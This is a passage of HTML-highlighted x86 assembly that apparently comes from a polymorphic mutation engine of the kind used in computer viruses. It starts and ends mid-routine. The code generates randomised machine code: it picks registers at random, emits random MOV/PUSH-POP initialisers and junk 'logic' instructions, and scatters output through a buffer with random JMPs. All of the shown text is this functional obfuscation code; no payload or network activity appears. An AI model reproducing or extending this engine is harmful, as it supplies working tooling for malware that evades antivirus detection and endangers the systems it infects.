                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; 1         copy 0/1</span><span class="sc0">

                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25E081h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@store_cmd_even0</span><span class="sc0">

</span><span class="sc5">@@r4</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_OR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@gen_value_restart</span><span class="sc0">

                        </span><span class="sc1">; em_reg or ? = edx</span><span class="sc0">
                        </span><span class="sc1">; 0         0    0</span><span class="sc0">
                        </span><span class="sc1">; 0         1    1</span><span class="sc0">
                        </span><span class="sc1">; 1         -    0</span><span class="sc0">
                        </span><span class="sc1">; 1         *    1</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; em_reg or ? = edx</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; 1        none 0</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@gen_value_restart</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@random_dword</span><span class="sc0">          </span><span class="sc1">; em_reg or ? = edx</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; 1         *   1</span><span class="sc0">

                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DC881h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@store_cmd</span><span class="sc0">

</span><span class="sc1">; ===================== random number generator =============================</span><span class="sc0">

</span><span class="sc5">@@random</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">randseed</span><span class="sc0">   </span><span class="sc1">; standard PASCAL's algorithm</span><span class="sc0">
                        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">214013</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2531011</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">randseed</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">@@random_dword</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rtmp</span><span class="sc0">
</span><span class="sc5">@@rtmp</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@random_byte</span><span class="sc0">
                        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">@@random_byte</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@random</span><span class="sc0">
                        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">@@rnd_zf</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_eax</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">@@rnd_eax</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@random</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; MUL is really kewl</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ===================== register selection management =======================</span><span class="sc0">

                        </span><span class="sc1">; get random register</span><span class="sc0">
</span><span class="sc5">@@get_rnd_reg</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_eax</span><span class="sc0">
                        </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc5">regavail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; "regavail" set only</span><span class="sc0">
                        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">@@get_rnd_reg</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

                        </span><span class="sc1">; get random initialized register</span><span class="sc0">
</span><span class="sc5">@@get_init_reg</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@get_rnd_reg</span><span class="sc0">   </span><span class="sc1">; get random reg</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@reg_init_eax</span><span class="sc0">  </span><span class="sc1">; initialize it (if not yet)</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

                        </span><span class="sc1">; check register &amp; initialize it if unitinitalized</span><span class="sc0">
                        </span><span class="sc1">; used 'coz initially em_reg[0..7] is unknown</span><span class="sc0">

</span><span class="sc5">@@reg_init_eax</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">bts</span><span class="sc0">     </span><span class="sc5">reginit</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; initialized?</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@reg_init_retn</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">           </span><span class="sc1">; JMP</span><span class="sc0">

                        </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_PUSHPOP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@init_mov</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_zf</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@init_pushpop</span><span class="sc0">

</span><span class="sc5">@@init_mov</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">        </span><span class="sc1">; MOV r, c</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@random_dword</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; store initial em_reg[]</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc5">@@init_done</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">


</span><span class="sc5">@@reg_init_retn</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">@@init_pushpop</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@random_dword</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; store initial em_reg[]</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@init_done</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

                        </span><span class="sc1">; get random initialized register marked as "free"</span><span class="sc0">
</span><span class="sc5">@@get_free_reg</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">regused</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">regavail</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@bad</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@get_init_reg</span><span class="sc0">
                        </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc5">regused</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@get_free_reg</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">@@bad</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">stc</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">

                        </span><span class="sc1">; this subroutine finds new output pointer (in EDI)</span><span class="sc0">

</span><span class="sc5">@@find_new_eip</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">C_EIP_MAX_ITER</span><span class="sc0"> </span><span class="sc1">; max number of restarts</span><span class="sc0">

</span><span class="sc5">@@eip_find</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; error if no free space</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@error2</span><span class="sc0">

                        </span><span class="sc1">; find random location within outbuf</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">o_max</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">C_EIP_TOP</span><span class="sc4">+</span><span class="sc5">C_EIP_BOTTOM</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">C_EIP_TOP</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">o_offs</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc1">; scan it -- should be unused</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">C_EIP_NEXT</span><span class="sc4">+</span><span class="sc5">C_EIP_PREV</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">o_fillchar</span><span class="sc0">
                        </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">scasb</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@eip_find</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">C_EIP_NEXT</span><span class="sc0">

                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

                        </span><span class="sc1">; this subroutine called before each command is</span><span class="sc0">
                        </span><span class="sc1">; stored to output stream</span><span class="sc0">
                        </span><span class="sc1">; it probably adds JMP to new random location</span><span class="sc0">

</span><span class="sc5">@@eip_do1</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">pushad</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@eip_do</span><span class="sc0">

</span><span class="sc5">@@eip</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">o_offs</span><span class="sc0">     </span><span class="sc1">; check if end of outbuf is</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">o_max</span><span class="sc0">      </span><span class="sc1">; reached. MUST add jmp then.</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">C_EIP_BOTTOM</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">@@eip_do</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">o_fillchar</span><span class="sc0"> </span><span class="sc1">; scan following code --</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">C_EIP_NEXT</span><span class="sc0"> </span><span class="sc1">; -- it should be unused,</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; MUST add jmp otherwise</span><span class="sc0">
                        </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">scasb</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@eip_do</span><span class="sc0">

                        </span><span class="sc1">; here we may skip jmp</span><span class="sc0">

                        </span><span class="sc5">flagsnz</span><span class="sc0"> </span><span class="sc5">FLAG_NOJMPS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@eip_done</span><span class="sc0"> </span><span class="sc1">; JMPs disabled? -exit</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">jmp_prob</span><span class="sc0">   </span><span class="sc1">; add JMP if rnd(jmp_prob)==0</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_eax</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@eip_done</span><span class="sc0">

</span><span class="sc5">@@eip_do</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc1">; well, here we MUST select new location, or die</span><span class="sc0">

                        </span><span class="sc5">flagsnz</span><span class="sc0"> </span><span class="sc5">FLAG_NOJMPS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@error3</span><span class="sc0"> </span><span class="sc1">; no JMPs? - error!</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">        </span><span class="sc1">; add JMP</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">; space for argument</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; save old position</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@find_new_eip</span><span class="sc0">  </span><span class="sc1">; try to find new location</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; link</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">@@eip_done</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">  </span><span class="sc1">; pushad_edi</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ===================== "logic" management ==================================</span><span class="sc0">

                        </span><span class="sc1">; this subroutine adds "logic" instruction into</span><span class="sc0">
                        </span><span class="sc1">; output stream.</span><span class="sc0">

</span><span class="sc5">@@poly_cmd</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc5">flagsnz</span><span class="sc0"> </span><span class="sc5">FLAG_NOLOGIC</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0"> </span><span class="sc1">; logic disabled? --exit</span><span class="sc0">

</span><span class="sc9">IFNDEF</span><span class="sc0">  </span><span class="sc5">LITE</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmdavail</span><span class="sc0">           </span><span class="sc1">; no avail cmds?</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmdavail2</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">         </span><span class="sc1">; --exit</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">regused</span><span class="sc0">            </span><span class="sc1">; all avail regs used?</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">regavail</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">         </span><span class="sc1">; --exit</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">                   </span><span class="sc1">; add JMP if needed</span><span class="sc0">

</span><span class="sc5">@@poly_cmd_restart</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">REG1</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">REG2</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">REG1_8</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc5">REG2_8</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc5">XXX</span><span class="sc0">                     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; fixed</span><span class="sc0">
</span><span class="sc5">XXX_8</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">                      </span><span class="sc1">; fixed</span><span class="sc0">

                        </span><span class="sc1">; reg1: destination, read-write</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@get_free_reg</span><span class="sc0">          </span><span class="sc1">; get free reg &lt;reg1&gt;</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc5">REG1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

                        </span><span class="sc1">; reg2: source, read-only. to write into, do check</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@get_init_reg</span><span class="sc0">          </span><span class="sc1">; get init reg &lt;reg2&gt;</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc5">REG2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@random_dword</span><span class="sc0">          </span><span class="sc1">; get random argument</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc5">XXX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">55</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_eax</span><span class="sc0">       </span><span class="sc1">; select random command index</span><span class="sc0">

                        </span><span class="sc1">; dispatch</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_not</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_neg</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_inc</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_dec</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_inc</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_dec</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_shl</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_shr</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_rol</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
